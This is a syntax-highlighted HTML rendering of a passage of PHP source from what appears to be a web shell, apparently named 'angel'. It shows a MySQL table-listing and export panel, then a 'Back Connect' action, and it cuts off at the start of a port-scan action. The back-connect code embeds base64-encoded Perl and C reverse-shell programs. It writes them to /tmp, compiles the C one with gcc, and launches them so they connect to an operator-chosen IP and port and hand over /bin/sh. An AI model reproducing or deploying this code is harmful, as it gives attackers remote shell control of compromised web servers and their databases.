<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">tabledb</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =&gt; $<span style="color: #ffeead;">table</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\'foc</span><span style="color: #99ffff; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #99ffff; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Name'</span>].<span style="color: #99ffff;">'\');</span><span style="color: #99ffff; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Rows'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Data_length'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Create_time'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Update_time'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">highver</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Engine'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Collation'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Name'</span>].<span style="color: #99ffff;">'\', </span><span style="color: #99ffff; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #99ffff; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">highver</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class='</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">'&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #ffeead;">table_num</span>.<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">table_rows</span>.<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">data_size</span>.<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td colspan="'</span>.($<span style="color: #ffeead;">highver</span> ? <span style="color: #ffffff; background-color: #002451;">5</span> : <span style="color: #ffffff; background-color: #002451;">3</span>).<span style="color: #99ffff;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;tr class=\""</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #ffeead;">highver</span> ? <span style="color: #ffffff; background-color: #002451;">9</span> : <span style="color: #ffffff; background-color: #002451;">7</span>).<span style="color: #99ffff;">"\"</span><span style="color: #99ffff; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'doing'</span>,<span style="color: #99ffff;">'backupmysql'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;/table&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fr(</span>$<span style="color: #ffeead;">query</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">tbfoot(</span>);
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">mysql_close(</span>);
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end mysql</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'backconnect'</span>) {
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">yourip</span> &amp;&amp; $<span style="color: #ffeead;">yourip</span> = $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'REMOTE_ADDR'</span>];
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">yourport</span> &amp;&amp; $<span style="color: #ffeead;">yourport</span> = <span style="color: #99ffff;">'12345'</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">usedb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'perl'</span>=&gt;<span style="color: #99ffff;">'perl'</span>,<span style="color: #99ffff;">'c'</span>=&gt;<span style="color: #99ffff;">'c'</span>);

<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">back_connect</span>=<span style="color: #99ffff;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #99ffff; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #99ffff; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #99ffff; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #99ffff; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #99ffff; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #99ffff; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">back_connect_c</span>=<span style="color: #99ffff;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #99ffff; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #99ffff; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #99ffff; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #99ffff; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #99ffff; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #99ffff; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #99ffff; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #99ffff;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #99ffff; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">start</span> &amp;&amp; $<span style="color: #ffeead;">yourip</span> &amp;&amp; $<span style="color: #ffeead;">yourport</span> &amp;&amp; $<span style="color: #ffeead;">use</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">use</span> == <span style="color: #99ffff;">'perl'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">cf(</span><span style="color: #99ffff;">'/tmp/angel_bc'</span>,$<span style="color: #ffeead;">back_connect</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #ffffff; background-color: #002451;">execute(which(</span><span style="color: #99ffff;">'perl'</span>).<span style="color: #99ffff;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">cf(</span><span style="color: #99ffff;">'/tmp/angel_bc.c'</span>,$<span style="color: #ffeead;">back_connect_c</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">unlink(</span><span style="color: #99ffff;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Back Connect'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'backconnect'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'Your IP:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'yourip'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">20</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">yourip</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'Your Port:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'yourport'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">yourport</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'Use:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeselect(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'use'</span>,<span style="color: #99ffff;">'option'</span>=&gt;$<span style="color: #ffeead;">usedb</span>,<span style="color: #99ffff;">'selected'</span>=&gt;$<span style="color: #ffeead;">use</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'start'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #99ffff;">'Start'</span>,<span style="color: #99ffff;">'type'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'class'</span>=&gt;<span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'portscan'</span>) {
